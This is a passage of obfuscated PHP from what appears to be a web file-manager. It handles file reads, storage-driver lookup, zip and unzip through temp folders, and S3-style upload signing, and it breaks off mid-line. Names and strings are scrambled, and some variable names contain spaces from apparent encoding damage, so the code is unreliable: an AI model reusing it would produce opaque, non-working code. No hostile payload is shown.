$¢£•ÌÏ¨ =& $_SERVER[äô®•½Â]; $‘Ó“èêŒ = self::driverMake($İéœñƒ); $ ƒÎ‹ = $‘Ó“èêŒ->size($İéœñƒ); $™€à™™ = $ˆôÙÄÏ‰; $š£Û¾ü— = $¤õ½·ñ÷; if ($ˆôÙÄÏ‰ < 0) { $ˆôÙÄÏ‰ = $ ƒÎ‹ + $ˆôÙÄÏ‰; } if ($¤õ½·ñ÷ === !1) { $¤õ½·ñ÷ = $ ƒÎ‹ - $ˆôÙÄÏ‰; } if ($ˆôÙÄÏ‰ + $¤õ½·ñ÷ > $ ƒÎ‹) { $¤õ½·ñ÷ = $ ƒÎ‹ - $ˆôÙÄÏ‰; } if (!$ ƒÎ‹ && $‘Ó“èêŒ->getType() == $¢£•ÌÏ¨[109] && !$‘Ó“èêŒ->exist($İéœñƒ)) { $ï‡¼°­¢ = get_path_this($İéœñƒ); $ìÕÏ¬Œ = parse_url_query($ï‡¼°­¢); if (is_array($ìÕÏ¬Œ) && isset($ìÕÏ¬Œ[$¢£•ÌÏ¨[32]])) { $ï‡¼°­¢ = urldecode($ìÕÏ¬Œ[$¢£•ÌÏ¨[32]]); } throw new Exception($¢£•ÌÏ¨[1241] . LNG($¢£•ÌÏ¨[1242]) . $¢£•ÌÏ¨[1038] . clear_html($ï‡¼°­¢) . $¢£•ÌÏ¨[12]); } if ($¤õ½·ñ÷ <= 0) { return $¢£•ÌÏ¨[12]; } if ($ˆôÙÄÏ‰ < 0 || $ˆôÙÄÏ‰ >= $ ƒÎ‹ || $¤õ½·ñ÷ > $GLOBALS[$¢£•ÌÏ¨[6]][$¢£•ÌÏ¨[92]][$¢£•ÌÏ¨[1243]]) { throw new Exception("\146\x69\x6c\145\x52\x65\x61\x64\x20\145\x72\162\x6f\x72\x2c\x6f\x76\145\162\40\151\157\x52\x65\141\144\115\x61\x78\41\40\x73\164\141\x72\164\x3d{$ˆôÙÄÏ‰}\73\x6c\x65\156\147\164\x68\x3d{$¤õ½·ñ÷}\x3b\x20\x73\x69\x7a\145\x3d{$ ƒÎ‹}\73"); } $·º‰•ƒ = $‘Ó“èêŒ->fileSubstr($İéœñƒ, $ˆôÙÄÏ‰, $¤õ½·ñ÷); if (!$·º‰•ƒ && $¤õ½·ñ÷ && isset($GLOBALS[$¢£•ÌÏ¨[1244]])) { throw new Exception($GLOBALS[$¢£•ÌÏ¨[1244]][$¢£•ÌÏ¨[1245]]); } return $·º‰•ƒ; } private static function driverMake(&$§éã) { $†±­ùŞ« =& $_SERVER[äô®•½Â]; $¦şßÓá‹ = KodIO::parse($§éã); if (!self::$driverListSystem) { $™ŠŞÛ¯À = Model($†±­ùŞ«[833])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($™ŠŞÛ¯À, $†±­ùŞ«[486]); } if ($¦şßÓá‹[$†±­ùŞ«[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¦şßÓá‹[$†±­ùŞ«[486]]]) { throw new Exception($†±­ùŞ«[1246]); return !1; } $§éã = $¦şßÓá‹[$†±­ùŞ«[1247]]; $úŒ¸…Ù = self::driverGet($¦şßÓá‹, $§éã); return $úŒ¸…Ù; } private static function driverGet($¸î„§†—, &$ÈÕş ªº) { $‘ò§ìõ =& $_SERVER[äô®•½Â]; $š½İ´™ = $¸î„§†—[$‘ò§ìõ[1248]]; $Åœ×Êµ = $¸î„§†—[$‘ò§ìõ[486]]; switch ($¸î„§†—[$‘ò§ìõ[33]]) { case KodIO::KOD_IO: $µıÎˆÀ = self::$driverListSystem[$Åœ×Êµ]; break; case KodIO::KOD_SOURCE: $ÈÕş ªº = $Åœ×Êµ . $ÈÕş ªº; $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1250], $‘ò§ìõ[6] => $¸î„§†—); $µıÎˆÀ[$‘ò§ìõ[6]][$‘ò§ìõ[1251]] = $¸î„§†—[$‘ò§ìõ[486]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ş¯ş£»î = $GLOBALS[$‘ò§ìõ[1252]]; self::$driverListUser = array_to_keyvalue($Ş¯ş£»î, $‘ò§ìõ[486]); } $µıÎˆÀ = self::$driverListUser[$Åœ×Êµ]; break; case KodIO::KOD_SHARE_LINK: $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1253], $‘ò§ìõ[6] => $¸î„§†—); $ô­‰¹˜Ã = Action($‘ò§ìõ[1254])->sharePathInfo($¸î„§†—[$‘ò§ìõ[87]]); $ÈÕş ªº = $ô­‰¹˜Ã[$‘ò§ìõ[194]]; if (!$ô­‰¹˜Ã[$‘ò§ìõ[194]]) { $ó¹¶’“ƒ = Model($‘ò§ìõ[680])->getInfo($ô­‰¹˜Ã[$‘ò§ìõ[681]]); $ÈÕş ªº = KodIO::clear($ó¹¶’“ƒ[$‘ò§ìõ[1255]] . $¸î„§†—[$‘ò§ìõ[1247]]); $¸î„§†—[$‘ò§ìõ[573]] = $ó¹¶’“ƒ; $¸î„§†—[$‘ò§ìõ[1228]] = $ÈÕş ªº; $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1256], $‘ò§ìõ[6] => $¸î„§†—); } else { $µıÎˆÀ[$‘ò§ìõ[6]][$‘ò§ìõ[1251]] = $ô­‰¹˜Ã[$‘ò§ìõ[194]]; } break; case KodIO::KOD_SHARE_ITEM: $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1257], $‘ò§ìõ[6] => $¸î„§†—); $ó¹¶’“ƒ = Model($‘ò§ìõ[680])->getInfo($¸î„§†—[$‘ò§ìõ[486]]); if ($ó¹¶’“ƒ[$‘ò§ìõ[194]] == $‘ò§ìõ[231]) { $ÈÕş ªº = KodIO::clear($ó¹¶’“ƒ[$‘ò§ìõ[1255]] . $¸î„§†—[$‘ò§ìõ[1247]]); $¸î„§†—[$‘ò§ìõ[573]] = $ó¹¶’“ƒ; $¸î„§†—[$‘ò§ìõ[1228]] = $ÈÕş ªº; $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1258], $‘ò§ìõ[6] => $¸î„§†—); } else { if (!$ÈÕş ªº) { $ÈÕş ªº = $ó¹¶’“ƒ[$‘ò§ìõ[194]]; } $µıÎˆÀ[$‘ò§ìõ[6]][$‘ò§ìõ[1251]] = $ó¹¶’“ƒ[$‘ò§ìõ[194]]; } break; default: $ÈÕş ªº = $¸î„§†—[$‘ò§ìõ[87]]; $µıÎˆÀ = array($‘ò§ìõ[1249] => $‘ò§ìõ[1259]); break; } $õ‡ä×÷å = $¸î„§†—[$‘ò§ìõ[87]]; if (!isset(self::$driverCache[$õ‡ä×÷å])) { $©•‚Ğç” = strtolower($µıÎˆÀ[$‘ò§ìõ[98]]); $¡úµÏÎ = $GLOBALS[$‘ò§ìõ[6]][$‘ò§ìõ[92]][$‘ò§ìõ[897]]; $òöÔä­° = $‘ò§ìõ[77] . (isset($¡úµÏÎ[$©•‚Ğç”]) ? $¡úµÏÎ[$©•‚Ğç”] : ucfirst($©•‚Ğç”)); if (!class_exists($òöÔä­°)) { show_json("{$òöÔä­°}\x20\x6e\x6f\164\40\x65\170\151\x73\x74\x73\41", !1); } $±Î·û„÷ = isset($µıÎˆÀ[$‘ò§ìõ[6]]) ? $µıÎˆÀ[$‘ò§ìõ[6]] : !1; self::$driverCache[$õ‡ä×÷å] = new $òöÔä­°($±Î·û„÷); } $Œ—ó½Ùö = self::$driverCache[$õ‡ä×÷å]; $Œ—ó½Ùö->pathDriver = $š½İ´™; $Œ—ó½Ùö->pathBase = $‘ò§ìõ[12]; if (isset($µıÎˆÀ[$‘ò§ìõ[6]][$‘ò§ìõ[1260]])) { $Œ—ó½Ùö->pathBase = rtrim($µıÎˆÀ[$‘ò§ìõ[6]][$‘ò§ìõ[1260]], $‘ò§ìõ[8]) . $‘ò§ìõ[8]; $ÈÕş ªº = $Œ—ó½Ùö->pathBase . ltrim($ÈÕş ªº, $‘ò§ìõ[8]); } $ÈÕş ªº = $Œ—ó½Ùö->getPath($ÈÕş ªº); if (isset($¸î„§†—[$‘ò§ìõ[1228]])) { $ÈÕş ªº = $¸î„§†—[$‘ò§ìõ[1228]]; } $Œ—ó½Ùö->path = $ÈÕş ªº; return $Œ—ó½Ùö; } public static function errorTips($ÒÑ³ÔÂ¹ = false) { $·ÅšÃ² =& $_SERVER[äô®•½Â]; static $è¾™³ù¿ = array(); $ß³Â÷úÎ = 1000; if ($ÒÑ³ÔÂ¹ === -1) { return $è¾™³ù¿ ? $è¾™³ù¿[count($è¾™³ù¿) - 1] : $·ÅšÃ²[12]; } if ($ÒÑ³ÔÂ¹ === !1) { return implode($·ÅšÃ²[288], $è¾™³ù¿); } if (count($è¾™³ù¿) >= $ß³Â÷úÎ) { $è¾™³ù¿ = array_slice($è¾™³ù¿, $ß³Â÷úÎ * 0.5, $ß³Â÷úÎ); } $è¾™³ù¿[] = $ÒÑ³ÔÂ¹; write_log($·ÅšÃ²[176] . ACTION . $·ÅšÃ²[1261] . $ÒÑ³ÔÂ¹, $·ÅšÃ²[1262]); } public static function getLastError($äå÷’«¥ = '') { $ÃËØĞ = self::errorTips(-1); return $ÃËØĞ ? $ÃËØĞ : $äå÷’«¥; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $£«¥”Ğ; if ($£«¥”Ğ) { return $£«¥”Ğ; } $ïŸè‚’ = IO::init($_SERVER[äô®•½Â][8]); return $ïŸè‚’; } private static function iconvSystem($”¢ú…ÚÀ) { return self::local()->iconvSystem($”¢ú…ÚÀ); } private static function iconvApp($›¦²¿ÇÔ) { return self::local()->iconvApp($›¦²¿ÇÔ); } public static function zipFolder($¹¦  è«, $æÆÈÅÁÑ = "\x7a\x69\160", $Î´ÇÚ† = '', $„Ü˜°òÕ = REPEAT_RENAME) { $ş¬¥È´· =& $_SERVER[äô®•½Â]; $şĞ‘âã = IO::listPath($¹¦  è«); if (!$şĞ‘âã) { return !1; } $şĞ‘âã = array_merge($şĞ‘âã[$ş¬¥È´·[85]], $şĞ‘âã[$ş¬¥È´·[86]]); return self::zip($şĞ‘âã, $æÆÈÅÁÑ, $Î´ÇÚ†, $„Ü˜°òÕ); } public static function zip($ıºÊ­«ö, $¶ªˆ”ßÕ = "\172\x69\160", $í˜¼æ’ = '', $ùÌ«¯ìĞ = REPEAT_RENAME) { $è¼‰ïÇÚ =& $_SERVER[äô®•½Â]; if (is_string($ıºÊ­«ö) && $ıºÊ­«ö) { $ıºÊ­«ö = array(array($è¼‰ïÇÚ[87] => $ıºÊ­«ö)); } $òªÁ£¥ = self::init($ıºÊ­«ö[0][$è¼‰ïÇÚ[87]]); $µ—ĞÈœã = self::info($ıºÊ­«ö[0][$è¼‰ïÇÚ[87]]); $…Ïä…Å½ = $è¼‰ïÇÚ[12]; $‰¿Ê¨´ñ = $è¼‰ïÇÚ[12]; $½“Ş‹¡Ş = $è¼‰ïÇÚ[12]; if ($í˜¼æ’ && substr($í˜¼æ’, -1, 1) != $è¼‰ïÇÚ[8]) { $‰¿Ê¨´ñ = get_path_father($í˜¼æ’); $½“Ş‹¡Ş = get_path_this($í˜¼æ’); } else { $‰¿Ê¨´ñ = self::pathFather($µ—ĞÈœã[$è¼‰ïÇÚ[87]]); $½“Ş‹¡Ş = $µ—ĞÈœã[$è¼‰ïÇÚ[32]] . $è¼‰ïÇÚ[10] . $¶ªˆ”ßÕ; if (count($ıºÊ­«ö) > 1) { $¥×ÚŸ¦¡ = IO::info($‰¿Ê¨´ñ); $½“Ş‹¡Ş = $¥×ÚŸ¦¡[$è¼‰ïÇÚ[32]] . $è¼‰ïÇÚ[10] . $¶ªˆ”ßÕ; } if ($í˜¼æ’) { $‰¿Ê¨´ñ = $í˜¼æ’; } } if ($òªÁ£¥->getType() == $è¼‰ïÇÚ[109]) { $•‘…üâ = self::init($‰¿Ê¨´ñ); $¶Öõ›åò = $•‘…üâ->getType() == $è¼‰ïÇÚ[109] ? $‰¿Ê¨´ñ : get_path_father($òªÁ£¥->path); $¶Öõ›åò = IO::getPathInner($¶Öõ›åò); $¶Öõ›åò = rtrim($¶Öõ›åò, $è¼‰ïÇÚ[8]) . $è¼‰ïÇÚ[8]; mk_dir($¶Öõ›åò); } else { $…Ïä…Å½ = TEMP_FILES . $è¼‰ïÇÚ[1263] . time() . rand_string(8) . $è¼‰ïÇÚ[8]; mk_dir($…Ïä…Å½); file_put_contents($…Ïä…Å½ . $è¼‰ïÇÚ[1264], $è¼‰ïÇÚ[12]); $¶Öõ›åò = $…Ïä…Å½; } $àüÌ·ü‹ = IO::info($¶Öõ›åò); if (!$àüÌ·ü‹ || !$àüÌ·ü‹[$è¼‰ïÇÚ[236]]) { show_json(LNG($è¼‰ïÇÚ[1265]), !1); } $¢éÜ®® = self::zipFileList($ıºÊ­«ö, $…Ïä…Å½); foreach ($¢éÜ®® as $ Šã™‚¿ => $œ‘ôá´) { $¢éÜ®®[$ Šã™‚¿] = self::iconvSystem($œ‘ôá´); } $Õ”ÀŞë = get_filename_auto($¶Öõ›åò . $½“Ş‹¡Ş, $è¼‰ïÇÚ[12], $ùÌ«¯ìĞ); KodArchive::create(self::iconvSystem($Õ”ÀŞë), $¢éÜ®®); if (!IO::exist($Õ”ÀŞë)) { if ($…Ïä…Å½) { del_dir($…Ïä…Å½); } write_log($è¼‰ïÇÚ[1266] . $Õ”ÀŞë, $è¼‰ïÇÚ[399]); show_json(LNG($è¼‰ïÇÚ[1267]), !1); } if (!$…Ïä…Å½) { return $Õ”ÀŞë; } $âÒ¾ï•¿ = self::move($Õ”ÀŞë, $‰¿Ê¨´ñ, $ùÌ«¯ìĞ); if ($…Ïä…Å½) { del_dir($…Ïä…Å½); } if (!$Õ”ÀŞë) { write_log($è¼‰ïÇÚ[1268] . $Õ”ÀŞë . $è¼‰ïÇÚ[1269] . $‰¿Ê¨´ñ, $è¼‰ïÇÚ[399]); show_json(LNG($è¼‰ïÇÚ[1267]), !1); } return $âÒ¾ï•¿; } public static function unzip($Ó„Ä÷ó¯, $†ÓêÉÀó, $íÍ¬Âª™ = "\x2d\x31", $íàô¸×ì = "\162\145\x70\x6c\141\143\x65") { $âÁ»­ß  =& $_SERVER[äô®•½Â]; $‘Ù·š¡µ = parent::info($Ó„Ä÷ó¯); if (!$‘Ù·š¡µ) { show_json(LNG($âÁ»­ß [1270]), !1); } $Ô¸äó¥ = IO::infoFullSimple($†ÓêÉÀó); if (!$Ô¸äó¥) { $†ÓêÉÀó = IO::mkdir($†ÓêÉÀó); } if (isset($Ô¸äó¥[$âÁ»­ß [194]]) && trim($Ô¸äó¥[$âÁ»­ß [87]], $âÁ»­ß [8]) != trim($†ÓêÉÀó, $âÁ»­ß [8])) { $ùğû°Ğ² = KodIO::make($Ô¸äó¥[$âÁ»­ß [193]]); $§ã¨„ÁĞ = IO::fileNameAuto($ùğû°Ğ², $Ô¸äó¥[$âÁ»­ß [32]], REPEAT_RENAME_FOLDER, !0); $†ÓêÉÀó = IO::mkdir($ùğû°Ğ² . $§ã¨„ÁĞ); } $íÍ¬Âª™ = $íÍ¬Âª™ && $íÍ¬Âª™ != $âÁ»­ß [1271] ? @json_decode($íÍ¬Âª™, !0) : -1; $¯¹¦œ¡Ä = self::unzipPart($Ó„Ä÷ó¯, $íÍ¬Âª™); if (!$¯¹¦œ¡Ä || !IO::exist($¯¹¦œ¡Ä[$âÁ»­ß [233]])) { show_json(LNG($âÁ»­ß [108]), !1); } $õ«ĞÜ¼ = $¯¹¦œ¡Ä[$âÁ»­ß [1272]][count($¯¹¦œ¡Ä[$âÁ»­ß [1272]]) - 1]; if ($õ«ĞÜ¼[$âÁ»­ß [1273]] == -1 || substr($õ«ĞÜ¼[$âÁ»­ß [32]], -1, 1) == $âÁ»­ß [8]) { $ÈÅ»Šª = $¯¹¦œ¡Ä[$âÁ»­ß [1274]] . rand_string(10) . $âÁ»­ß [8]; mk_dir($ÈÅ»Šª); $ŞŞ¢ï×å = count($¯¹¦œ¡Ä[$âÁ»­ß [1272]]) == 1 ? IO::ext($Ó„Ä÷ó¯) : get_path_ext($¯¹¦œ¡Ä[$âÁ»­ß [233]]); $Ë„«›Üƒ = KodArchive::extract(self::iconvSystem($¯¹¦œ¡Ä[$âÁ»­ß [233]]), $ÈÅ»Šª, $õ«ĞÜ¼[$âÁ»­ß [1273]], $§ã¨„ÁĞ, $ŞŞ¢ï×å); self::unzipErrorCheck($Ë„«›Üƒ, array($âÁ»­ß [1275], $Ó„Ä÷ó¯, $ŞŞ¢ï×å, $†ÓêÉÀó, $¯¹¦œ¡Ä)); Hook::trigger($âÁ»­ß [1276], $ÈÅ»Šª); recursion_dir($ÈÅ»Šª, $•×îµŸİ, $áğÒş‡, 0); $öĞ›øÍÓ = array_merge($•×îµŸİ, $áğÒş‡); $ı¢¾˜ = array(); foreach ($öĞ›øÍÓ as $å–øÛÙ¹) { $ĞşÏ ç¼ = IO::move(self::iconvApp($å–øÛÙ¹), $†ÓêÉÀó, $íàô¸×ì); if ($ĞşÏ ç¼) { $ı¢¾˜[] = $ĞşÏ ç¼; } } del_dir($ÈÅ»Šª); } else { $ĞşÏ ç¼ = IO::move($¯¹¦œ¡Ä[$âÁ»­ß [233]], $†ÓêÉÀó, $íàô¸×ì, get_path_this($õ«ĞÜ¼[$âÁ»­ß [32]])); if ($ĞşÏ ç¼) { $ı¢¾˜[] = $ĞşÏ ç¼; } } return $ı¢¾˜ ? $ı¢¾˜ : !1; } public static function unzipList($¹×Óå”) { $›‡¨Ìì— =& $_SERVER[äô®•½Â]; $Îı‚Ğ‹ = isset($¹×Óå”[$›‡¨Ìì—[1277]]) ? $¹×Óå”[$›‡¨Ìì—[1277]] : !1; $Õº‡Ï…¨ = isset($¹×Óå”[$›‡¨Ìì—[1273]]) ? @json_decode($¹×Óå”[$›‡¨Ìì—[1273]], !0) : -1; $ŞÖíò´º = self::unzipPart($¹×Óå”[$›‡¨Ìì—[87]], $Õº‡Ï…¨); if (!$ŞÖíò´º || !IO::exist($ŞÖíò´º[$›‡¨Ìì—[233]])) { show_json(LNG($›‡¨Ìì—[108]), !1); } $™ş€‘¸ = $ŞÖíò´º[$›‡¨Ìì—[1272]][count($ŞÖíò´º[$›‡¨Ìì—[1272]]) - 1]; $ÄÁúâ¢Ò = in_array(IO::ext($ŞÖíò´º[$›‡¨Ìì—[233]]), array($›‡¨Ìì—[399], $›‡¨Ìì—[1278], $›‡¨Ìì—[1279], $›‡¨Ìì—[1280], $›‡¨Ìì—[1281], $›‡¨Ìì—[1282])); if (!$Îı‚Ğ‹ && ($™ş€‘¸[$›‡¨Ìì—[1273]] == -1 || $ÄÁúâ¢Ò)) { $êíÛş– = $ŞÖíò´º[$›‡¨Ìì—[1274]] . get_path_this($ŞÖíò´º[$›‡¨Ìì—[233]]) . $›‡¨Ìì—[1283]; if (!IO::exist($êíÛş–)) { $Äı€ºô = $™ş€‘¸[$›‡¨Ìì—[1273]] == -1 ? get_path_ext(IO::pathThis($¹×Óå”[$›‡¨Ìì—[87]])) : get_path_ext($ŞÖíò´º[$›‡¨Ìì—[233]]); $¶ÁÍğ¡ = KodArchive::listContent(self::iconvSystem($ŞÖíò´º[$›‡¨Ìì—[233]]), !0, $Äı€ºô); self::unzipErrorCheck($¶ÁÍğ¡, array($›‡¨Ìì—[1284], $¹×Óå”, $ŞÖíò´º)); @file_put_contents($êíÛş–, json_encode($¶ÁÍğ¡[$›‡¨Ìì—[1285]])); } return @json_decode(IO::getContent($êíÛş–), !0); } IO::fileOut($ŞÖíò´º[$›‡¨Ìì—[233]], $Îı‚Ğ‹, get_path_this($™ş€‘¸[$›‡¨Ìì—[32]])); die; } private static function zipFileList($÷‰«Î•¤, $åÅ•½Ê = false) { $×ªöÓŸ÷ =& $_SERVER[äô®•½Â]; $¿Û¨êÎ = array(); foreach ($÷‰«Î•¤ as $õï©Š•š) { $êÁÍ± = $õï©Š•š[$×ªöÓŸ÷[87]]; if ($åÅ•½Ê) { $êÁÍ± = self::copy($õï©Š•š[$×ªöÓŸ÷[87]], $åÅ•½Ê, $×ªöÓŸ÷[890]); } else { $»åğæ¿ê = self::init($õï©Š•š[$×ªöÓŸ÷[87]]); if ($»åğæ¿ê->getType() == $×ªöÓŸ÷[109]) { $êÁÍ± = $»åğæ¿ê->path; } } if ($êÁÍ± && self::local()->exist($êÁÍ±)) { $¿Û¨êÎ[$õï©Š•š[$×ªöÓŸ÷[87]]] = $êÁÍ±; } } if (!empty($¿Û¨êÎ)) { return array_values($¿Û¨êÎ); } show_json(LNG($×ªöÓŸ÷[1242]), !1); } private static function localFilePath($µşà¼ßë) { $œş¾ùŞæ =& $_SERVER[äô®•½Â]; $ÃÕÔ¦¼ = KodIO::parse($µşà¼ßë); if ($ÃÕÔ¦¼[$œş¾ùŞæ[33]] == KodIO::KOD_SOURCE) { $ìàÒÀà— = Model($œş¾ùŞæ[896])->fileInfoGet(KodIO::sourceID($µşà¼ßë)); if (!$ìàÒÀà—[$œş¾ùŞæ[87]]) { show_json($œş¾ùŞæ[1286], !1); } $µşà¼ßë = $ìàÒÀà—[$œş¾ùŞæ[87]]; } $âÍ¦ü‹š = self::init($µşà¼ßë); if ($âÍ¦ü‹š->pathParse[$œş¾ùŞæ[1228]]) { $µşà¼ßë = $âÍ¦ü‹š->pathParse[$œş¾ùŞæ[1228]]; $âÍ¦ü‹š = self::init($µşà¼ßë); } $ç¹Ïıù˜ = $âÍ¦ü‹š->getType(); if ($ç¹Ïıù˜ == $œş¾ùŞæ[109] || $ç¹Ïıù˜ == $œş¾ùŞæ[1287]) { if (!$âÍ¦ü‹š->exist($âÍ¦ü‹š->path)) { show_json(LNG($œş¾ùŞæ[108]), !1); } return $âÍ¦ü‹š->path; } return !1; } public static function unzipPart($¦È„Û°ñ, $óäô˜Ú = -1) { $¼‹¦Ê™‹ =& $_SERVER[äô®•½Â]; $¸éù²° = IO::pathThis($¦È„Û°ñ); if (!$óäô˜Ú || $óäô˜Ú == -1) { $Ûëİ¥Çİ = array(array($¼‹¦Ê™‹[32] => $¸éù²°, $¼‹¦Ê™‹[1273] => -1)); $Ûëİ¥Çİ[0][$¼‹¦Ê™‹[1288]] = $Ûëİ¥Çİ[0][$¼‹¦Ê™‹[32]]; } else { if (is_array($óäô˜Ú)) { $Ûëİ¥Çİ = $óäô˜Ú; $õ‚ğ–†­ = count($Ûëİ¥Çİ) - 1; for ($­“­ëã« = 0; $­“­ëã« <= $õ‚ğ–†­; $­“­ëã«++) { $Æª›‡ò£ = $Ûëİ¥Çİ[$­“­ëã«]; $¹¼‘ˆÛò = get_path_this($Æª›‡ò£[$¼‹¦Ê™‹[32]]) . (checkExtSafe($Æª›‡ò£[$¼‹¦Ê™‹[32]]) ? $¼‹¦Ê™‹[12] : $¼‹¦Ê™‹[1289]); $Ûëİ¥Çİ[$­“­ëã«][$¼‹¦Ê™‹[1288]] = $¼‹¦Ê™‹[1290] . intval($Æª›‡ò£[$¼‹¦Ê™‹[1273]]) . $¼‹¦Ê™‹[473] . $¹¼‘ˆÛò; if ($­“­ëã« == 0) { continue; } $Ûëİ¥Çİ[$­“­ëã«][$¼‹¦Ê™‹[1288]] = $Ûëİ¥Çİ[$­“­ëã« - 1][$¼‹¦Ê™‹[1288]] . $¼‹¦Ê™‹[1291] . $Ûëİ¥Çİ[$­“­ëã«][$¼‹¦Ê™‹[1288]]; } } } if (!is_array($Ûëİ¥Çİ) || count($Ûëİ¥Çİ) == 0) { return !1; } $éµ«£³Ç = $Ûëİ¥Çİ[count($Ûëİ¥Çİ) - 1]; if (!IO::exist($¦È„Û°ñ)) { return !1; } $‚Òò™ = TEMP_FILES . $¼‹¦Ê™‹[1292] . kodIO::hashPathSafe($¦È„Û°ñ) . $¼‹¦Ê™‹[8]; $ÜÕÑÉâ² = $‚Òò™ . $éµ«£³Ç[$¼‹¦Ê™‹[1288]]; mk_dir($‚Òò™); file_put_contents(TEMP_FILES . $¼‹¦Ê™‹[1264], $¼‹¦Ê™‹[12]); if (IO::exist($ÜÕÑÉâ²)) { return array($¼‹¦Ê™‹[233] => $ÜÕÑÉâ², $¼‹¦Ê™‹[1272] => $Ûëİ¥Çİ, $¼‹¦Ê™‹[1274] => $‚Òò™); } $ü’¸²® = self::localFilePath($¦È„Û°ñ); if (!$ü’¸²®) { $ü’¸²® = $‚Òò™ . $¼‹¦Ê™‹[1293]; if (!IO::exist($ü’¸²®)) { self::copy($¦È„Û°ñ, $‚Òò™, !1, get_path_this($ü’¸²®)); } } if (!$ü’¸²® || !IO::exist($ü’¸²®)) { return !1; } if ($éµ«£³Ç[$¼‹¦Ê™‹[1273]] == -1) { return array($¼‹¦Ê™‹[233] => $ü’¸²®, $¼‹¦Ê™‹[1272] => $Ûëİ¥Çİ, $¼‹¦Ê™‹[1274] => $‚Òò™); } $±ºÆŞ• = $ü’¸²®; foreach ($Ûëİ¥Çİ as $­“­ëã« => $Æª›‡ò£) { if (!$Æª›‡ò£ || $Æª›‡ò£[$¼‹¦Ê™‹[1273]] == $¼‹¦Ê™‹[1271]) { break; } if (substr($Æª›‡ò£[$¼‹¦Ê™‹[32]], -1, 1) == $¼‹¦Ê™‹[8]) { break; } $Â¢ò±‚± = in_array(get_path_ext($Æª›‡ò£[$¼‹¦Ê™‹[1288]]), array($¼‹¦Ê™‹[399], $¼‹¦Ê™‹[1278], $¼‹¦Ê™‹[1279], $¼‹¦Ê™‹[1280], $¼‹¦Ê™‹[1281], $¼‹¦Ê™‹[1282])); $ãÒ©²†ı = $­“­ëã« == count($Ûëİ¥Çİ) - 1 && $Â¢ò±‚±; $È—œ¢‹ì = $‚Òò™ . $Æª›‡ò£[$¼‹¦Ê™‹[1288]]; $¯¡‚šİø = $‚Òò™ . get_path_this($Æª›‡ò£[$¼‹¦Ê™‹[32]]); if (IO::exist($È—œ¢‹ì)) { $±ºÆŞ• = $È—œ¢‹ì; continue; } $Â¬×·Û½ = $­“­ëã« == 0 ? get_path_ext($¸éù²°) : get_path_ext($±ºÆŞ•); $ÆŠæ¦ª´ = KodArchive::extract(self::iconvSystem($±ºÆŞ•), $‚Òò™, $Æª›‡ò£[$¼‹¦Ê™‹[1273]], $ÍØÜ•Û¶, $Â¬×·Û½); self::unzipErrorCheck($ÆŠæ¦ª´, array($¼‹¦Ê™‹[1294], $¦È„Û°ñ, $Ûëİ¥Çİ, $Æª›‡ò£, $È—œ¢‹ì)); if (IO::exist($¯¡‚šİø)) { IO::rename($¯¡‚šİø, get_path_this($È—œ¢‹ì)); } $±ºÆŞ• = $È—œ¢‹ì; } $ÜÕÑÉâ² = $±ºÆŞ•; return array($¼‹¦Ê™‹[233] => $±ºÆŞ•, $¼‹¦Ê™‹[1272] => $Ûëİ¥Çİ, $¼‹¦Ê™‹[1274] => $‚Òò™); } private static function unzipErrorCheck($±Ú…ªø×, $©Ê¯–¶Î = false) { $ Ùç»©™ =& $_SERVER[äô®•½Â]; if ($±Ú…ªø×[$ Ùç»©™[1295]]) { return !0; } write_log(array($ Ùç»©™[1296], $±Ú…ªø×, $©Ê¯–¶Î), $ Ùç»©™[1297]); $ÍÎ¡·°Ö = is_array($±Ú…ªø×[$ Ùç»©™[1285]]) ? json_encode($±Ú…ªø×[$ Ùç»©™[1285]]) : $±Ú…ªø×[$ Ùç»©™[1285]]; show_json($ Ùç»©™[1298] . $ÍÎ¡·°Ö, !1); die; } } goto B¾Üˆ„ì Ï; B¶Á—Åœ”Ÿ: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($œĞÉï¶¹) { parent::__construct($œĞÉï¶¹); $this->setSignVersion($_SERVER[äô®•½Â][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÑÃŞºÓ™) { parent::__construct($ÑÃŞºÓ™); $this->setSignVersion($_SERVER[äô®•½Â][250]); } public function uploadFormData($€ñ—¿Ş™, $åóü©­Ã = 3600) { $œ™‰ó‡› =& $_SERVER[äô®•½Â]; $ñû¦æÏ = $œ™‰ó‡›[232]; $ÇÁ–ƒÈ = $œ™‰ó‡›[260]; $´¶ì—ü = $œ™‰ó‡›[62]; $ê´£¸ = gmdate($œ™‰ó‡›[261]); $¥¢ÏâşÑ = gmdate($œ™‰ó‡›[262]); $†’Ç”˜Æ = $œ™‰ó‡›[263]; $Âêóîó° = $åóü©­Ã . $œ™‰ó‡›[12]; $‰ÙÍˆæ½ = $œ™‰ó‡›[264]; $ñæèì¹÷ = array($this->accessKey, $¥¢ÏâşÑ, $this->region, $´¶ì—ü, $†’Ç”˜Æ); $‰Î¨ìœâ = implode($œ™‰ó‡›[8], $ñæèì¹÷); $ü¿Øæï = array($œ™‰ó‡›[265] => gmdate($œ™‰ó‡›[1418], strtotime($œ™‰ó‡›[267])), $œ™‰ó‡›[268] => array(array($œ™‰ó‡›[269] => $this->bucket), array($œ™‰ó‡›[309] => $ñû¦æÏ), array($œ™‰ó‡›[270], $œ™‰ó‡›[271], $œ™‰ó‡›[12]), array($œ™‰ó‡›[270], $œ™‰ó‡›[272], $œ™‰ó‡›[12]), array($œ™‰ó‡›[270], $œ™‰ó‡›[310], $œ™‰ó‡›[12]), array($œ™‰ó‡›[273] => $‰ÙÍˆæ½), array($œ™‰ó‡›[274] => $‰Î¨ìœâ), array($œ™‰ó‡›[275] => $ÇÁ–ƒÈ), array($œ™‰ó‡›[276] => $ê´£¸), array($œ™‰ó‡›[277] => $Âêóîó°))); $ÙˆàÎ£Ü = base64_encode(json_encode($ü¿Øæï)); $Ç•öıÜè = hash_hmac($œ™‰ó‡›[278], $¥¢ÏâşÑ, $œ™‰ó‡›[279] . $this->secret, !0); $ùíšæÆİ = hash_hmac($œ™‰ó‡›[278], 